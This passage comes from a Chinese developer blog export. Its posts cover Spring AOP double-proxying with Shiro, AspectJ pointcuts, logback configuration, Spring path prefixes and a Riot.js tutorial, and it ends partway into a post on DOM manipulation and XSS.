AopNamespaceHandler 的类进行处理，进入该类(直接在工程全局搜)我们可以看到 1234567891011public class AopNamespaceHandler extends NamespaceHandlerSupport &#123; public AopNamespaceHandler() &#123; &#125; public void init() &#123; this.registerBeanDefinitionParser(&quot;config&quot;, new ConfigBeanDefinitionParser()); this.registerBeanDefinitionParser(&quot;aspectj-autoproxy&quot;, new AspectJAutoProxyBeanDefinitionParser()); this.registerBeanDefinitionDecorator(&quot;scoped-proxy&quot;, new ScopedProxyBeanDefinitionDecorator()); this.registerBeanDefinitionParser(&quot;spring-configured&quot;, new SpringConfiguredBeanDefinitionParser()); &#125;&#125; aspectj-autoproxy 是由 AspectJAutoProxy BeanDefinitionParser 注册的，然后根据该Blog提出的说法 进入AspectJAutoProxyBeanDefinitionParser 找到parse函数，看到其调用registerAspectJAnnotationAutoProxyCreatorIfNecessary来注册BeanDefinition 进入registerAspectJAnnotationAutoProxyCreatorIfNecessary可以看到内部的三个register方法 三个register方法分别对应上述代码中第一个参数的输入，但是均调用了AopConfigUtils 点击AopConfigUtils，可以发现所有的方法都最终调用registerOrEscalateApcAsRequired registerOrEscalateApcAsRequired中有个简单的if…else判断 主要控制了逻辑，如果存在internalAutoProxyCreator则不进行创建新的 该Blog作者提出，由于 12&lt;aop:aspectj-autoproxy&#x2F;&gt; 方式对应的注册AutoProxyCreator 的方法是：registerAspectJAnnotationAutoProxyCreatorIfNecessaryDefaultAdvisorAutoProxyCreator 方式对应的注册AutoProxyCreator 的方法是：registerAutoProxyCreatorIfNecessary； 最终会在第七步骤的函数里，由于这个if…else判断导致不能存在两个代理，所以不能混合使用 DefaultAdvisorAutoProxyCreator 与 aop:aspectj-autoproxy 这个结论是错误的，是因为DefaultAdvisorAutoProxyCreator不会调用registerAutoProxyCreatorIfNecessary，产生错误的原因是二次代理作者追踪错了代码，只是恰巧改对了 DefaultAdvisorAutoProxyCreator来，跟着我找 DefaultAdvisorAutoProxyCreator 如何创建代理的代码 进入DefaultAdvisorAutoProxyCreator(直接Command或者Ctrl+点击进入) 看到其继承于AbstractAdvisorAutoProxyCreator，进入 可以看到AbstractAdvisorAutoProxyCreator继承于AbstractAutoProxyCreator继续进入 AbstractAutoProxyCreator中有一个方法叫做createProxy，名字太直接了，叫做创建代理 在createProxy中有一个ProxyFactory对象，就是代理的工厂模式(工厂模式请自行学习) ProxyFactory对象继承于ProxyCreatorSupport ProxyCreatorSupport中有对象aopProxyFactory用来创建AOP代理(就是切面代理，注意切面代理是属于动态代理的一种) ProxyCreatorSupport在构造函数中new了一个DefaultAopProxyFactory给aopProxyFactory赋值 进入DefaultAopProxyFactory可以看到切面代理创建方法createAopProxy 在判断条件包含 !config.isProxyTargetClass() 时，也就是不使用针对Class的代理的时候，看下一句 return new JdkDynamicAopProxy(config) 根据config配置返回JDK动态代理 这也是我们在文章一中所说的，通常情况下Spring使用针对接口的JDK代理进行动态代理，绕了这么久，我们回到第五步，看 createProxy 方法如何使用 ProxyFactory对象 可以看到createProxy 返回值 return proxyFactory.getProxy(this.getProxyClassLoader()) 进入ProxyFactory对象的getProxy方法 可以看到 return this.createAopProxy().getProxy(classLoader) 首先调用了createAopProxy，发现ProxyFactory没有这个方法，所以来自父类 ProxyCreatorSupport 点击进入 看到createAopProxy 内包含this.getAopProxyFactory().createAopProxy(this) 首先拿到了上文第九步创建的DefaultAopProxyFactory，然后调用了其createAopProxy 以上完成了 DefaultAdvisorAutoProxyCreator 动态代理的创建 两次代理的内部细节有一些文章分析给出无法确定二次代理的情况下哪个代理成功，但是根据我本身追踪日志发现，在Spring启动时，我的切面类日志输出成功 12[2016-10-23 14:00:13][qtp1938298155-28][INFO ][] c.b.psas.web.aspect.ControllerLogAspect 28 -- 网络请求开始 RequestURL: &#x2F; RequestVO参数: null[2016-10-23 14:00:13][qtp1938298155-28][INFO ][] c.b.psas.web.aspect.ControllerLogAspect 33 -- 网络请求结束 RequestURL: &#x2F; RequestVO参数: null 但是在调用接口时，开启DEBUG日志，会发现Shiro抛出的异常为 1234567891011121314151617181920212223242526272829303132333435363738[2016-10-23 13:38:52][qtp1386909980-27][DEBUG][] o.s.web.servlet.DispatcherServlet 1197 -- Handler execution resulted in exception - forwarding to resolved error view: ModelAndView: reference to view with name &#39;&#x2F;errors&#x2F;500&#39;; model is &#123;exception&#x3D;java.lang.IllegalStateException: The mapped controller method class &#39;com.bestpay.psas.web.controller.manage.LoginController&#39; is not an instance of the actual controller bean class &#39;com.sun.proxy.$Proxy103&#39;. If the controller requires proxying (e.g. due to @Transactional), please use class-based proxying.HandlerMethod details:Controller [com.bestpay.psas.web.controller.manage.LoginController]Method [public java.lang.String com.bestpay.psas.web.controller.manage.LoginController.login()]Resolved arguments:&#125;java.lang.IllegalStateException: The mapped controller method class &#39;com.bestpay.psas.web.controller.manage.LoginController&#39; is not an instance of the actual controller bean class &#39;com.sun.proxy.$Proxy103&#39;. If the controller requires proxying (e.g. due to @Transactional), please use class-based proxying.HandlerMethod details:Controller [com.bestpay.psas.web.controller.manage.LoginController]Method [public java.lang.String com.bestpay.psas.web.controller.manage.LoginController.login()]Resolved arguments: at org.springframework.web.method.support.InvocableHandlerMethod.assertTargetBean(InvocableHandlerMethod.java:262) ~[spring-web-4.1.9.RELEASE.jar:4.1.9.RELEASE] at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:225) ~[spring-web-4.1.9.RELEASE.jar:4.1.9.RELEASE] at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:137) ~[spring-web-4.1.9.RELEASE.jar:4.1.9.RELEASE] at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:110) ~[spring-webmvc-4.1.9.RELEASE.jar:4.1.9.RELEASE] at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:775) ~[spring-webmvc-4.1.9.RELEASE.jar:4.1.9.RELEASE] at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:705) ~[spring-webmvc-4.1.9.RELEASE.jar:4.1.9.RELEASE] at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:85) ~[spring-webmvc-4.1.9.RELEASE.jar:4.1.9.RELEASE] at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:959) [spring-webmvc-4.1.9.RELEASE.jar:4.1.9.RELEASE] at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:893) [spring-webmvc-4.1.9.RELEASE.jar:4.1.9.RELEASE] at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:965) [spring-webmvc-4.1.9.RELEASE.jar:4.1.9.RELEASE] at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:856) [spring-webmvc-4.1.9.RELEASE.jar:4.1.9.RELEASE] at javax.servlet.http.HttpServlet.service(HttpServlet.java:735) [servlet-api-3.0.jar:na] at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:841) [spring-webmvc-4.1.9.RELEASE.jar:4.1.9.RELEASE] at javax.servlet.http.HttpServlet.service(HttpServlet.java:848) [servlet-api-3.0.jar:na] at org.eclipse.jetty.servlet.ServletHolder.handle(ServletHolder.java:684) [jetty-servlet-8.1.17.v20150415.jar:8.1.17.v20150415] at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1496) [jetty-servlet-8.1.17.v20150415.jar:8.1.17.v20150415] at org.apache.shiro.web.servlet.AbstractShiroFilter.executeChain(AbstractShiroFilter.java:449) [shiro-web-1.2.4.jar:1.2.4] at org.apache.shiro.web.servlet.AbstractShiroFilter$1.call(AbstractShiroFilter.java:365) [shiro-web-1.2.4.jar:1.2.4] at org.apache.shiro.subject.support.SubjectCallable.doCall(SubjectCallable.java:90) [shiro-core-1.2.4.jar:1.2.4] at org.apache.shiro.subject.support.SubjectCallable.call(SubjectCallable.java:83) [shiro-core-1.2.4.jar:1.2.4] at org.apache.shiro.subject.support.DelegatingSubject.execute(DelegatingSubject.java:383) [shiro-core-1.2.4.jar:1.2.4] at org.apache.shiro.web.servlet.AbstractShiroFilter.doFilterInternal(AbstractShiroFilter.java:362) [shiro-web-1.2.4.jar:1.2.4] at org.apache.shiro.web.servlet.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:125) [shiro-web-1.2.4.jar:1.2.4] at org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate(DelegatingFilterProxy.java:344) [spring-web-4.1.9.RELEASE.jar:4.1.9.RELEASE] at org.springframework.web.filter.DelegatingFilterProxy.doFilter(DelegatingFilterProxy.java:261) [spring-web-4.1.9.RELEASE.jar:4.1.9.RELEASE] 可以在日志中发现几个关键字 org.apache.shiro.web.servlet.AbstractShiroFilter.executeChain com.sun.proxy.$Proxy103 InvocableHandlerMethod.doInvoke 三个关键字分别说明了 是Shiro产生了异常，而不是AOP Shiro尝试去采用了JDK代理 报错在Invoke方法时 解决方法生效的原因方法一因为Shiro也是基于Spring的AOP类的，如果找不到合适的配置，就是默认采用同一个Context下的AOP代理配置，我们给了其proxy-target-class为true，自然就在第二次代理的时候找得到方法 方法二方法二就更直接了，告诉DefaultAdvisorAutoProxyCreator为True就好 杂想我以前写过另一个文章，讨论了SpringMVC和Spring公用的情况下Transactional失效的问题很有可能底层原因也是二次代理","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"Aspect","slug":"Aspect","permalink":"http://yoursite.com/tags/Aspect/"}]},{"title":"切面编程(二):基于注解的切面类使用","date":"2016-10-20T21:00:00.000Z","path":"2016/10/21/切面编程二基于注解的切面类使用/","text":"定义一个切面类可以使用注解@Aspect定义一个切面类，最常用的就是日志追踪 123456@Aspect &#x2F;&#x2F;定义该类为切面@Component &#x2F;&#x2F;让Spring扫描加入控制反转@Slf4j &#x2F;&#x2F;Lombok的日志打印public class ServiceLogAspect &#123; ......&#125; 寻找切点(PointCut)动态代理理解的透彻的话，我们可以发现，其是针对某个接口下 一组方法 进行的控制，如果想具体到 某一个方法 需要自己在 invoke函数的参数method 进行逻辑判断，而切点则不用，其通过表达式(就是规定好的字符串)方法可以控制到 一个方法or一个接口or一个包下所有类 不同的具体程度 1234567891011121314@Pointcut(value &#x3D; &quot;execution(public * com.company.service.impl..*.*(..))&quot;)public void logService() &#123;&#125;@Before(value &#x3D; &quot;logService()&quot;)public void logBefore(JoinPoint joinPoint) &#123;&#125;@After(value &#x3D; &quot;logService()&quot;)public void logAfterReturning(JoinPoint joinPoint) &#123;&#125; 表达式 execution(public * com.company.service.impl...(..)) 的意思是 execution(…) 执行某个函数 某个函数是public类型的 返回值是 * 代表任意类型 impl后的两个点 .. 代表在包名com.company.service.impl目录和其子目录下 ..*. 代表目录和其子目录下任意一个Class(如果是 ..*user. 的意思就是结尾为user的Class) 最后括号前的 *(..) 代表任意方法和任意参数，括号内是参数 后边的Before和After就很好理解啦，就是以下方法在动态代理的方法前还是之后执行，除了Before和After还有Around和AfterThrowing、AfterReturning 除了使用以上的编程习惯，也可以直接在其余注解中使用表达式，例如@Before(value = “execution(public * com.company.service.impl...(..))”) Spring Aspect表达式的官方文档节选 123456789* execution - for matching method execution join points, this is the primary pointcut designator you will use when working with Spring AOP* within - limits matching to join points within certain types (simply the execution of a method declared within a matching type when using Spring AOP)* this - limits matching to join points (the execution of methods when using Spring AOP) where the bean reference (Spring AOP proxy) is an instance of the given type* target - limits matching to join points (the execution of methods when using Spring AOP) where the target object (application object being proxied) is an instance of the given type* args - limits matching to join points (the execution of methods when using Spring AOP) where the arguments are instances of the given types* @target - limits matching to join points (the execution of methods when using Spring AOP) where the class of the executing object has an annotation of the given type* @args - limits matching to join points (the execution of methods when using Spring AOP) where the runtime type of the actual arguments passed have annotations of the given type(s)* @within - limits matching to join points within types that have the given annotation (the execution of methods declared in types with the given annotation when using Spring AOP)* @annotation - limits matching to join points where the subject of the join point (method being executed in Spring AOP) has the given annotation JointPoint是什么JointPoint是一个包裹了在动态代理中，调用了哪个方法，哪个类，以及都有什么参数的Object，例如 1234567891011121314151617181920212223&#x2F;** * 获取连接点的方法 *&#x2F;static public Method getInvokeMethod(JoinPoint joinPoint) &#123; MethodSignature methodSignature &#x3D; (MethodSignature)joinPoint.getSignature(); return methodSignature.getMethod();&#125;&#x2F;** * 获得连接点的Field *&#x2F;static public Field[] getFields(JoinPoint joinPoint) &#123; Field[] fields &#x3D; joinPoint.getTarget().getClass().getDeclaredFields(); return fieldList;&#125;&#x2F;** * 获得连接点的参数 *&#x2F;static public Object[] getParamters(JoinPoint joinPoint) &#123; return joinPoint.getArgs();&#125; 获得切面方法抛出的异常和返回值除了可以或者我们切面的方法和参数信息，还可以获得到万一抛出了异常或者执行完毕后的值 1234567891011121314151617&#x2F;** * 定义抛出类的型参名称为ex，并传入切面 *&#x2F;@AfterThrowing(value &#x3D; &quot;logService()&quot;, throwing &#x3D; &quot;ex&quot;)public void logAfterThrowing(JoinPoint joinPoint, Exception ex) &#123; String message &#x3D; (ex.getMessage() &#x3D;&#x3D; null)?ex.getClass().getName():ex.getMessage(); log.warn(&quot;方法抛出异常: &#123;&#125; &quot;,message);&#125;&#x2F;** * 定义返回值的型参名称为r，并传入切面 *&#x2F;@AfterReturning(value &#x3D; &quot;logService()&quot;, returning &#x3D; &quot;r&quot;)public void logAfterReturning(JoinPoint joinPoint, Object r) &#123; log.info(&quot;方法调用结束 返回值：&#123;&#125;&quot;,r.toString());&#125;","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"Aspect","slug":"Aspect","permalink":"http://yoursite.com/tags/Aspect/"}]},{"title":"切面编程(一):Spring与SpringMVC中的切面","date":"2016-10-20T20:00:00.000Z","path":"2016/10/21/切面编程一Spring中的切面/","text":"切面编程是什么切面编程说的高大上，其实就是动态代理，参考慕课网教程 如果再讲的透彻一点。。就是使用反射动态的构造一个新的Class，新的Class包含旧的Class，可以在旧的Class执行前后和中间插入代码 Spring中如何使用切面Maven配置Spring本身提供对切面的支持(注意是支持),但是本身并不能实现切面功能，必须借助AspectJ才行，所以记得在你的Pom文件中加入以下代码 12345&lt;!-- aspectjweaver --&gt;&lt;dependency&gt; &lt;groupId&gt;org.aspectj&lt;&#x2F;groupId&gt; &lt;artifactId&gt;aspectjweaver&lt;&#x2F;artifactId&gt; &lt;version&gt;$&#123;aspectj.version&#125;&lt;&#x2F;version&gt; Context配置除了在POM中加入了AspectJ之外，需要在Spring和SpringMVC的配置文件中启用切面 注意Spring和SpringMVC要分别起用 注意Beans 要有命名空间 xmlns:aop=”http://www.springframework.org/schema/aop&quot; 和 Location xsi:schemaLocation=”http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop.xsd&quot; Spring配置文件 applicationContext.xml123&lt;beans .....&gt; &lt;aop:aspectj-autoproxy&#x2F;&gt;&lt;&#x2F;beans&gt; SpringMVC配置文件 spring-mvc.xml123&lt;beans .....&gt; &lt;aop:aspectj-autoproxy proxy-target-class&#x3D;&quot;true&quot;&#x2F;&gt;&lt;&#x2F;beans&gt; 为什么配置不一样在开篇我们提到，所谓切面编程就是动态代理，那么动态代理有两种方式，一种是JDK本身提供的DynamicProxy，还有一种是CGLIB提供的，参考文章从动态代理中取出Target两者的区别在于： JDK的动态代理是针对接口的，某个Class首先要实现某个接口，可以对接口方法进行代理 CGLib是针对具体的Class的，不需要你的Object去implement某个接口 在SpringMVC配置中的 proxy-target-class 等于true的意思就是(中文直译)：代理-目标-Class为真，即使用cglib进行代理，这里注意如果你的pom里没有cglib的包，在使用了这个选项记得加上 为什么MVC要使用CGLib代理在通常情况下(约定俗成)Java的开发者都有一颗面向接口编程的心，或者是C++转来的觉得没有个.h文件总感觉哪里不对劲，所以大家都写了 XXXService: 某个接口 XXXServiceImpl: 某个实现 所以说Spring里的类一般都有一个接口，所以可以使用JDK的动态代理，但是在SpringMVC的Controller里呢？通常大家都这么写 12345@Controller@RequestMapping(value &#x3D; &quot;&#x2F;user&quot;)public class UserController &#123; ...... &#125; 其 本身并没有实现任何接口，所以需要使用CGLib直接对Class进行动态代理 那Spring里使用CGLib行不行Spring里当然也可以使用CGLib，但是由于一般Service会牵扯到事务Transactional，事务的实现也是由JDK动态代理实现的，所以作为强迫症，我推荐大家还是使用JDK自身的动态代理 闲话关于为什么Java的Service中要使用一个接口对应一个实现的问题，知乎上有过专门的讨论，总体来讲大家都觉得是.h文件写High了的后遗症，使用接口固然有它的好处，在重构的时候可以减少工作量，但是大部分情况下，如果一个接口只有一个实现，在Java中只会产生冗余的文件，因为要记得接口本身是为了多态而存在的，总之看个人习惯吧。 如果Service里不写接口，只能用CGLib做动态代理了，强迫症表示有点不适应","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"Aspect","slug":"Aspect","permalink":"http://yoursite.com/tags/Aspect/"}]},{"title":"slf4j和logback的关系和配置原理","date":"2016-10-19T20:00:00.000Z","path":"2016/10/20/slf4j和logback的关系和配置原理/","text":"slf4j和logback什么关系slf4j: Simple Logging Facade for Java 简单日志切面For Java，在博客中作者解释是 “为java提供的简单日志Facade。Facade：门面，更底层一点说就是接口” 但是我认为这里的Facade是指AOP中切面的意思，后半句感觉才是重点，SLF4J提供的是一套接口，并没有具体的实现。有点类似于一个标准，而logbook就是其中一个SLF4J的具体实现 logback配置原理logback的的配置原理有三点 日志分级: 在打印日志时从高到低分为5个级别 error &gt; warn &gt; info &gt; debug &gt; trace 然后在不同分区上(Java包名内)都可以设置 日志打印机: 打印机就是Appender，可以设定打印的格式,可以挂在分区内 日志分区: 就是根据Java包名来进行区域划分，每个区域都可以设置自己都分级和打印机，根分区是Root 分级、打印机、分区的拟物比较你可以把整个日志系统想像成一列火车，车头是代码，车尾是打印结果，你抱着代码里的日志走过每一节车厢，每个车厢就是不同的logger(分区，包括root)，每一个车厢里放有不同的打印机(appender)，然后你走进每一节车厢，都会查看当前车厢的打印等级(level)，然后把大于等于车厢等级的日志打印出来，如果在某个车厢里切断了传递(logger的additivity为false)，那在以后的车厢包括root就不再打印了，如果某个logger(车厢)没有设定additivity或者appender(打印机)，均在最后一节车厢root进行打印。 logback配置讲解对logback的使用进行简单讲解 配置文件放哪里配置文件起名叫logback.xml放在resources的根目录下就好，因为logback本身和spring貌似没什么关系，所以也不用在spring里配置 配置文件根结点如同spirng配置文件的beans根结点一样，logback的根节点叫做configuration 12345&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;configuration&gt; ........&lt;&#x2F;configuration&gt; 日志分级和分区在根结点下可以使用logger标签进行不同的分区，但是一定要记得配置root标签，至少要有root可以没有其他的分区 123456789101112131415161718&lt;configuration&gt; &lt;!--包名为org.springframework下的所有日志输出ERROR级别--&gt; &lt;logger level&#x3D;&quot;ERROR&quot; name&#x3D;&quot;org.springframework&quot;&#x2F;&gt; &lt;!--包名为java.sql下的所有日志输出DEBUG级别--&gt; &lt;logger level&#x3D;&quot;DEBUG&quot; name&#x3D;&quot;java.sql&quot; additivity&#x3D;&quot;false&quot;&gt; &lt;appender-ref ref&#x3D;&quot;STDOUT&quot;&#x2F;&gt; &lt;&#x2F;logger&gt; &lt;!--root日志输出WARN级别--&gt; &lt;!--代表除了org.springframework和java.sql之外的包均以WARN级别输出--&gt; &lt;root level&#x3D;&quot;WARN&quot; &gt; &lt;appender-ref ref&#x3D;&quot;logfile&quot;&#x2F;&gt; &lt;&#x2F;root&gt;&lt;&#x2F;configuration&gt; 在以上这个配置中，最外层的网使用的是WARN级别，而另外两个日志分区 org.springframework: 仅可以输出 ERROR 级别的日志，由于ROOT可以输出WARN级别的日志，所以最终会被输出两次 java.sql: 可以输出 ERROR WARN INFO DEBUG 级别的日志，由于additivity被设置了false，所以root不会再次打印 打印机Appender除了可以对日志进行分类和分级以外，还可以使用不同的Appender标签定义不同的日志输出样式，并且使用一些关键字来获取到程序运行的信息 控制台输出可以完成控制台输出的类是 ch.qos.logback.core.ConsoleAppender 使用Appender节点配置可以配置它的输出样式 12345678910111213&lt;configuration&gt; &lt;!-- 管控台日志打印，发布生产需注释 --&gt; &lt;appender name&#x3D;&quot;STDOUT&quot; class&#x3D;&quot;ch.qos.logback.core.ConsoleAppender&quot;&gt; &lt;encoder charset&#x3D;&quot;utf-8&quot;&gt; &lt;!-- encoder 可以指定字符集，对于中文输出有意义 --&gt; &lt;!-- %.-1level 只显示信息级别的首字母,%-5level 左对齐显示信息级别全称 --&gt; &lt;!-- 如需自定义关键字，用 %mdc&#123;键名&#125; 表示,程序中用MDC.put(&quot;键名&quot;,&quot;键值&quot;)设置，可动态设置 [%logger:%line]--&gt; &lt;Pattern&gt;[%date&#123;yyyy-MM-dd HH:mm:ss&#125;][%thread][%-5level][%mdc&#123;TRACE_ID&#125;] %c&#123;40&#125; %line -- %msg%n&lt;&#x2F;Pattern&gt; &lt;&#x2F;encoder&gt; &lt;&#x2F;appender&gt;&lt;&#x2F;configuration&gt; 带有回滚功能的文件输出除了可以输出到控制台，还可以输出到磁盘文件中，并且还有定期回滚功能的类是 ch.qos.logback.core.rolling.RollingFileAppender 1234567891011121314151617181920&lt;configuration&gt; &lt;!-- 系统日志打印 --&gt; &lt;appender name&#x3D;&quot;logfile&quot; class&#x3D;&quot;ch.qos.logback.core.rolling.RollingFileAppender&quot;&gt; &lt;File&gt;logs&#x2F;psas.log&lt;&#x2F;File&gt; &lt;encoder&gt; &lt;Pattern&gt;[%date][%thread][%-5level] %c&#123;40&#125; %line --%mdc&#123;client&#125; [%X&#123;TRACE_LOG_ID&#125;] %msg%n&lt;&#x2F;Pattern&gt; &lt;charset&gt;UTF-8&lt;&#x2F;charset&gt; &lt;&#x2F;encoder&gt; &lt;rollingPolicy class&#x3D;&quot;ch.qos.logback.core.rolling.TimeBasedRollingPolicy&quot;&gt; &lt;fileNamePattern&gt;rollbacklog&#x2F;$&#123;logger.logback.logpath&#125;rollback&#x2F;psas-%d&#123;yyyy-MM-dd&#125;.%i.log&lt;&#x2F;fileNamePattern&gt; &lt;maxHistory&gt;30&lt;&#x2F;maxHistory&gt; &lt;TimeBasedFileNamingAndTriggeringPolicy class&#x3D;&quot;ch.qos.logback.core.rolling.SizeAndTimeBasedFNATP&quot;&gt; &lt;maxFileSize&gt;512MB&lt;&#x2F;maxFileSize&gt; &lt;&#x2F;TimeBasedFileNamingAndTriggeringPolicy&gt; &lt;&#x2F;rollingPolicy&gt; &lt;&#x2F;appender&gt;&lt;&#x2F;configuration&gt; 这里需要注意的是 File 和 fileNamePattern 都是以容器目录为上级目录设定的 关键字占位符 关键字 含义 %date 时间，可以在后边加{yyyy-MM-dd HH:mm:ss}来规定格式 %thread 线程号 %level 日志等级 %c 类名 %line 发生在哪一行 %msg 日志信息 %n 换行 具体的详细配置可以参考官方文档或者网友博客 使用MDC放入自定义信息MDC是SLF4J提供的一个MAP，可以以KEY-VALUE的形式放入一些关键字，然后在日志的格式里通过 %mdc{KEY} 或者 %X{KEY} 的方式输出Value值，例如 123456import org.slf4j.MDC;import java.util.UUID;&#x2F;&#x2F;放入一个随机字符串在同一个线程下进行同一个操作不同次调用的追踪&#x2F;&#x2F;多用于数据库操作时，同一个函数多次被调用MDC.put(Constants.LOG_TRACE_ID, UUID.randomUUID().toString());","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"Log","slug":"Log","permalink":"http://yoursite.com/tags/Log/"}]},{"title":"Spring配置文件中的classpath和file","date":"2016-10-14T19:00:00.000Z","path":"2016/10/15/Spring配置文件中的classpath和file/","text":"Spring配置文件中的路径Spring中好多地方要用到路径，classpath貌似在以前的文章里讲过，这里主要提一下file 占位符 路径 classpath: war包中的classes目录的根目录 classpath*: war包中classes目录的根目录以及Jar包的classes根目录 file: 计算机硬盘的文件系统 所以说如果要加载Jar包内的XML文件的话，需要使用带星号的 这里file要注意一下，有些时候如果file指定的目录，用户不具有权限肯定会报错，比如Mac下的 /usr 这种目录，以及Linux里没有分配好的权限的目录","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"Spring","slug":"Spring","permalink":"http://yoursite.com/tags/Spring/"},{"name":"Configure","slug":"Configure","permalink":"http://yoursite.com/tags/Configure/"}]},{"title":"Riot简单教程","date":"2016-09-07T01:00:00.000Z","path":"2016/09/07/Riot简单教程/","text":"Riot在文章大量DOM的操作中我们提到JS改变DOM一直都是个比较坑爹的事情，不仅要防着XSS还要简单便于理解，为了解决React的复杂性，Riot诞生了(其实我想查查它什么时候诞生的，但是官网喵了一下没看到) Riot的核心思想Riot的核心思想，是把部分的DOM和代码逻辑封装成一个为tag的文件，然后在需要的时候mount，在不需要的时候unmount。 mount: 加载，在页面中显示 unmount: 卸载，在页面中移除 这个思想，根据我的理解是一个典型的MVVM模式，理解MVVM模式应该一看就能懂，可以查看我Blog中MVVM的文章。 准备tag我们首先准备一个tag 1234567891011&lt;my-tag&gt; &lt;!-- 布局 --&gt; &lt;h3&gt;&#123; opts.title &#125;&lt;&#x2F;h3&gt; &lt;div&gt;&#123; opts.text &#125;&lt;&#x2F;div&gt; &lt;!-- 逻辑 --&gt; &lt;script&gt; this.title &#x3D; &quot;标题3&quot; &lt;&#x2F;script&gt;&lt;&#x2F;my-tag&gt; 这里看到会有2个问题 my-tag 这个标签HTML认么？ opts是啥？ 答案是 因为tag是自定义的，所以才要起个html不认识的标签 opts是mount函数的一个参数，用于装数据 mount函数mount就是把实现准备好的一部分HTML和JS加载到当前页面上，虽然根据官方文档有很多种用法，这里从最基本的三参数做举例 1riot.mount(dom,tag,opts); 三参数的mount函数最便于理解 参数 意义 举例 dom 具体加载到HTML文件的哪里 document.getElementById(“”) tag 要加载哪个tag “my-tag” opts 要带什么参数进去，使用一个JS对象传入数据 {title:””,text:””} 具体举例可以看文章末尾简单的试验 除了标准的使用方法，riot还自身支持选择器和JQuery,还有单参数和双参数的使用方法请看官方文档 12riot.mount(selector, tagName, [opts]) &#x2F;&#x2F;直接传入选择器 &quot;#id&quot;riot.mount($(&quot;#id&quot;), tagName, [opts]) &#x2F;&#x2F;直接传入JQuery对象 update和Ajax在网页中我们最常用的就是Ajax，现在我们来看riot的update函数和ajax的结合 1234567891011121314&lt;ajax-tag&gt; &lt;ul&gt; &lt;li each&#x3D;&#123;datas&#125; id&#x3D;&quot;name&#123;id&#125;&quot;&gt;&#123;name&#125;&lt;&#x2F;li&gt; &lt;&#x2F;ul&gt; &lt;script&gt; var self &#x3D; this $.get(url,function(response)&#123; self.datas &#x3D; response self.update() &#125;) &lt;&#x2F;script&gt;&lt;&#x2F;ajax-tag&gt; 为什么使用self和update由于Ajax是异步的，所以说当我们mount的时候，很多信息还没有得到具体的值，需要进行两步操作 首先在ajax回调函数外声明self变量让它指向tag本身，也就是this，因为回调函数内的this是指向回调函数而不是tag 在ajax回调函数内部使用self指向tag，然后给tag.datas赋值，datas内部需要有“id”和”name”，才会循环赋值给不同的li标签 在完成以上操作之后，使用update函数，顾名思义就是重新渲染HTML文档，调用Riot的Render 取id的小坑如果我们想对 1&lt;li id&#x3D;&quot;name1&quot;&gt;Lily&lt;&#x2F;li&gt; 这个DOM操作，我们需要在 self.update() 之后操作，因为update之前，这些内容还没有被Render到HTML文档，也就是说HTML文档中没有这些内容，getElementById是取不到这个DOM的 还有哪些关注点Riot除了以上这些常用的功能外，还有 动态赋值的 yield 功能，可以执行一些Runtime操作 标签套用 Nest 功能实现标签套标签实现更加复杂的功能 参数合并的 Mixin 功能来创建公用的数据 参考官网 Riot中文版 简单的试验通过以下代码，可以进行简单的试验 12345678910111213141516171819202122&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset&#x3D;&quot;utf-8&quot;&gt; &lt;&#x2F;head&gt; &lt;body&gt; &lt;div id&#x3D;&quot;main&quot;&gt; &lt;&#x2F;div&gt; &lt;!-- 加载Riot --&gt; &lt;script src&#x3D;&quot;js&#x2F;riot+compiler.min.js&quot; charset&#x3D;&quot;utf-8&quot;&gt;&lt;&#x2F;script&gt; &lt;!-- 加载自定义的tag --&gt; &lt;script src&#x3D;&quot;js&#x2F;my-tag.tag&quot; type&#x3D;&quot;riot&#x2F;tag&quot; charset&#x3D;&quot;utf-8&quot;&gt;&lt;&#x2F;script&gt; &lt;!-- 执行Mount --&gt; &lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt; riot.mount(document.getElementById(&quot;main&quot;),&quot;my-tag&quot;,&#123;title:&quot;标题3&quot;,text:&quot;内容&quot;&#125;) &lt;&#x2F;script&gt; &lt;&#x2F;body&gt;&lt;&#x2F;html&gt;","tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"http://yoursite.com/tags/JavaScript/"},{"name":"FrontEnd","slug":"FrontEnd","permalink":"http://yoursite.com/tags/FrontEnd/"},{"name":"HTML","slug":"HTML","permalink":"http://yoursite.com/tags/HTML/"}]},{"title":"HTML的大量DOM操作和防XSS","date":"2016-09-04T01:00:00.000Z","path":"2016/09/04/HTML的大量DOM操作和防XSS/","text":"DOM操作在好多百度的答案里，如果要对DOM进行操作，都是直接append，然后拼接出来HTML字符串 123456$(&quot;body&quot;) .append( &#39;&lt;div id&#x3D;&quot;iamloading__box&quot; data-load&#x3D;&quot;load&quot;&gt;&#39; + &#39;&lt;div id&#x3D;&quot;iamloading__box_center&quot;&gt;&lt;img id &#x3D; &quot;loading-image&quot; src&#x3D; 